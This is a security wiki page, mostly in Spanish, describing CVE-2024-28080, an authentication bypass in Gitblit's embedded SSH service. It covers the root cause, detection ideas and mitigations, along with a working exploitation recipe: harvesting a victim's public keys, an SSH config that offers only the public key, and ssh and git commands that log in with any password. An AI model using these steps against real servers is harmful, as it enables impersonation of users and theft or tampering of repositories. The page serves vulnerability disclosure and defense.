# Gitblit Embedded SSH Auth Bypass (CVE-2024-28080)

{{#include ../../banners/hacktricks-training.md}}

## Summary

CVE-2024-28080 es un bypass de autenticación en el servicio embedded SSH de Gitblit debido a un manejo incorrecto del estado de session al integrarse con Apache MINA SSHD. Si una cuenta de usuario tiene al menos una public key SSH registrada, un atacante que conozca el username y cualquiera de las public keys de ese usuario puede autenticarse sin el private key y sin la password.

- Affected: Gitblit < 1.10.0 (observed on 1.9.3)
- Fixed: 1.10.0
- Requirements to exploit:
- Git over SSH enabled on the instance
- Victim account has at least one SSH public key registered in Gitblit
- Attacker knows victim username and one of their public keys (often discoverable, e.g., https://github.com/<username>.keys)

## Root cause (state leaks between SSH methods)

En RFC 4252, la public‑key authentication procede en dos fases: el servidor primero comprueba si una public key proporcionada es aceptable para un username, y solo después de un challenge/response con una signature autentica al user. En MINA SSHD, el PublickeyAuthenticator se invoca dos veces: en la aceptación de la key (aún no hay signature) y más tarde, después de que el cliente devuelva una signature.

El PublickeyAuthenticator de Gitblit mutó el contexto de la session en la primera llamada pre‑signature al asociar el UserModel autenticado a la session y devolver true ("key acceptable"). Cuando la autenticación más tarde cayó de vuelta a password, el PasswordAuthenticator confió en ese estado de session mutado y cortocircuitó, devolviendo true sin validar la password. Como resultado, cualquier password (incluida la vacía) era aceptada después de una previa "acceptance" por public‑key para el mismo user.

Flujo defectuoso a alto nivel:

1) Client offers username + public key (no signature yet)
2) Server recognizes the key as belonging to the user and prematurely attaches user to the session, returns true ("acceptable")
3) Client cannot sign (no private key), so auth falls back to password
4) Password auth sees a user already present in session and unconditionally returns success

## Step‑by‑step exploitation

- Collect a victim’s username and one of their public keys:
- GitHub exposes public keys at https://github.com/<username>.keys
- Public servers often expose authorized_keys
- Configure OpenSSH to present only the public half so signature generation fails, forcing a fallback to password while still triggering the public‑key acceptance path on the server.

Example SSH client config (no private key available):
```sshconfig
# ~/.ssh/config
Host gitblit-target
HostName <host-or-ip>
User <victim-username>
PubkeyAuthentication yes
PreferredAuthentications publickey,password
IdentitiesOnly yes
IdentityFile ~/.ssh/victim.pub   # public half only (no private key present)
```
Conéctese y presione Enter en el aviso de contraseña (o escriba cualquier cadena):
```bash
ssh gitblit-target
# or Git over SSH
GIT_SSH_COMMAND="ssh -F ~/.ssh/config" git ls-remote ssh://<victim-username>@<host>/<repo.git>
```
La autenticación tiene éxito porque la fase anterior de public‑key mutó la sesión a un usuario autenticado, y password auth confía incorrectamente en ese estado.

Nota: Si ControlMaster multiplexing está habilitado en la configuración de SSH, comandos Git posteriores pueden reutilizar la conexión autenticada, aumentando el impacto.

## Impacto

- Suplantación completa de cualquier usuario de Gitblit que tenga al menos una SSH public key registrada
- Acceso de lectura/escritura a repositorios según los permisos de la víctima (exfiltración de código fuente, pushes no autorizados, riesgos de supply‑chain)
- Impacto administrativo potencial si se ataca a un usuario admin
- Explotación puramente de red; no se requiere fuerza bruta ni private key

## Ideas de detección

- Revisar logs de SSH en busca de secuencias donde un intento de publickey es seguido por una autenticación por password exitosa con una contraseña vacía o muy corta
- Buscar flujos: método publickey ofreciendo material de clave no soportado/incompatible seguido por un éxito inmediato de password para el mismo nombre de usuario

## Mitigaciones

- Actualizar a Gitblit v1.10.0+
- Hasta que se actualice:
- Deshabilitar Git sobre SSH en Gitblit, o
- Restringir el acceso de red al servicio SSH, y
- Monitorear los patrones sospechosos descritos arriba
- Rotar las credenciales de usuarios afectados si se sospecha compromiso

## General: abuso del state‑leakage del método de autenticación SSH (servicios basados en MINA/OpenSSH)

Patrón: Si el public‑key authenticator de un servidor muta el estado de usuario/sesión durante la fase pre‑signature "key acceptable" y otros authenticators (p. ej., password) confían en ese estado, puedes omitir la autenticación mediante:

- Presentar una public key legítima del usuario objetivo (sin private key)
- Forzar al cliente a fallar en la firma para que el servidor recurra a password
- Proporcionar cualquier password mientras el password authenticator se ataja por leaked state

Consejos prácticos:

- Public key harvesting at scale: pull public keys from common sources such as https://github.com/<username>.keys, organizational directories, team pages, leaked authorized_keys
- Forcing signature failure (client‑side): point IdentityFile to only the .pub, set IdentitiesOnly yes, keep PreferredAuthentications to include publickey then password
- MINA SSHD integration pitfalls:
- PublickeyAuthenticator.authenticate(...) no debe adjuntar estado de usuario/sesión hasta que la ruta de verificación post‑signature confirme la firma
- PasswordAuthenticator.authenticate(...) no debe inferir éxito a partir de cualquier estado mutado durante un método de autenticación previo e incompleto

Notas relacionadas de protocolo/diseño y literatura:
- SSH userauth protocol: RFC 4252 (publickey method is a two‑stage process)
- Historical discussions on early acceptance oracles and auth races, e.g., CVE‑2016‑20012 disputes around OpenSSH behavior

## References

- [Gitblit CVE-2024-28080: SSH public‑key fallback to password authentication bypass (Silent Signal blog)](https://blog.silentsignal.eu/2025/06/14/gitblit-cve-CVE-2024-28080/)
- [Gitblit v1.10.0 release notes](https://github.com/gitblit-org/gitblit/releases/tag/v1.10.0)
- [Apache MINA SSHD project](https://mina.apache.org/sshd-project/)
- [PublickeyAuthenticator API](https://svn.apache.org/repos/infra/websites/production/mina/content/sshd-project/apidocs/org/apache/sshd/server/auth/pubkey/PublickeyAuthenticator.html)
- [RFC 4252: The Secure Shell (SSH) Authentication Protocol](https://datatracker.ietf.org/doc/html/rfc4252)


{{#include ../../banners/hacktricks-training.md}}
